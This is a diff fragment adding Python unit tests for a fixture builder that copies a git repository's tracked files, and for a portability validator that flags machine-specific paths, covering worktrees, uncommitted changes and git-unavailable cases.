+ def commit(self,root):
+  self.git(root,'add','-A'); self.git(root,'commit','-q','-m','initial')
+ def test_untracked_file_excluded(self):
+  source=self.repository(); (source/'README.md').write_text('# tracked\n'); self.commit(source)
+  (source/'specs').mkdir(); (source/'specs/local.md').write_text(MACHINE_PATH+'\n')
+  fixture=build_fixture(source,self.tmp/'fixture')
+  self.assertFalse((fixture/'specs/local.md').exists())
+  self.assertFalse(any(e.startswith('portability:') for e in validate(fixture)))
+ def test_uncommitted_change_preserved(self):
+  source=self.repository(); (source/'README.md').write_text('HEAD content\n'); self.commit(source)
+  (source/'README.md').write_text('working content\n')
+  fixture=build_fixture(source,self.tmp/'fixture')
+  self.assertEqual((fixture/'README.md').read_text(),'working content\n')
+ def test_missing_tracked_file_fails(self):
+  source=self.repository(); (source/'README.md').write_text('# x\n'); (source/'gone.md').write_text('# gone\n'); self.commit(source)
+  (source/'gone.md').unlink()
+  with self.assertRaises(RuntimeError) as caught: build_fixture(source,self.tmp/'fixture')
+  self.assertIn('gone.md',str(caught.exception))
+ def test_without_git_copies_tree_and_reports_limitation(self):
+  source=self.tmp/'export'; (source/'__pycache__').mkdir(parents=True); (source/'artifacts').mkdir()
+  (source/'keep.md').write_text('# keep\n'); (source/'__pycache__/x.pyc').write_text('x'); (source/'artifacts/log').write_text('x')
+  out=io.StringIO()
+  with contextlib.redirect_stdout(out): fixture=build_fixture(source,self.tmp/'fixture')
+  self.assertEqual(out.getvalue(),NO_GIT_NOTICE+'\n')
+  self.assertTrue((fixture/'keep.md').is_file()); self.assertFalse((fixture/'__pycache__').exists()); self.assertFalse((fixture/'artifacts').exists())
+ def test_tracked_machine_path_still_fails_portability(self):
+  source=self.repository(); (source/'README.md').write_text(MACHINE_PATH+'\n'); self.commit(source)
+  fixture=build_fixture(source,self.tmp/'fixture')
+  self.assertTrue((fixture/'README.md').is_file())
+  self.assertTrue(any(e.startswith('portability:') for e in validate(fixture)))
+ def test_git_unavailable_does_not_fallback(self):
+  source=self.repository(); (source/'README.md').write_text('# x\n'); self.commit(source)
+  (source/'local.md').write_text(MACHINE_PATH+'\n'); (self.tmp/'empty-bin').mkdir()
+  path=os.environ.get('PATH'); os.environ['PATH']=str(self.tmp/'empty-bin')
+  out=io.StringIO()
+  try:
+   with contextlib.redirect_stdout(out), self.assertRaises(RuntimeError) as caught: build_fixture(source,self.tmp/'fixture')
+  finally:
+   if path is None: os.environ.pop('PATH',None)
+   else: os.environ['PATH']=path
+  self.assertIn('git is unavailable',str(caught.exception)); self.assertNotIn(NO_GIT_NOTICE,out.getvalue()); self.assertFalse((self.tmp/'fixture').exists())
+ def test_worktree_git_file_copies_tracked_content(self):
+  source=self.repository(); (source/'README.md').write_text('HEAD content\n'); self.commit(source)
+  linked=self.tmp/'linked'; self.git(source,'worktree','add','-q','-b','linked-branch',str(linked))
+  (linked/'README.md').write_text('working content\n')
+  self.assertTrue((linked/'.git').is_file())
+  out=io.StringIO()
+  with contextlib.redirect_stdout(out): fixture=build_fixture(linked,self.tmp/'fixture')
+  self.assertNotIn(NO_GIT_NOTICE,out.getvalue())
+  self.assertEqual((fixture/'README.md').read_text(),'working content\n')
+ def test_ls_files_failure_does_not_fallback(self):
+  source=self.tmp/'broken'; source.mkdir(); (source/'.git').write_text('not a gitdir\n')
+  (source/'local.md').write_text(MACHINE_PATH+'\n')
+  out=io.StringIO()
+  with contextlib.redirect_stdout(out), self.assertRaises(RuntimeError) as caught: build_fixture(source,self.tmp/'fixture')
+  self.assertIn('git ls-files failed',str(caught.exception))
+  self.assertNotIn(NO_GIT_NOTICE,out.getvalue()); self.assertFalse((self.tmp/'fixture').exists())
+if __name__=='__main__': unittest.main(verbosity=2)
